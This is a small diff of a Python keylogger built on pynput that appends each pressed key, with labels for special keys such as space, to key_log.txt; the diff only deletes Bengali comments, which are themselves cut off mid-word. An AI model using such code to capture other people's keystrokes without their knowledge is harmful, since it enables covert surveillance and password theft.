@@ -1,15 +1,14 @@
 from pynput.keyboard import Key, Listener
 
-# যেখানে কে
 log_file = "key_log.txt"
 
 def on_press(key):
     try:
-        # সাধারণ কী (বর্ণ বা ে
+        
         with open(log_file, "a") as f:
             f.write(f"{key.char}")
     except AttributeError:
-        # স্পেশাল কী (যেমন: Space, Eে
+        
         with open(log_file, "a") as f:
             if key == Key.space:
                 f.write(" [SPACE] ")
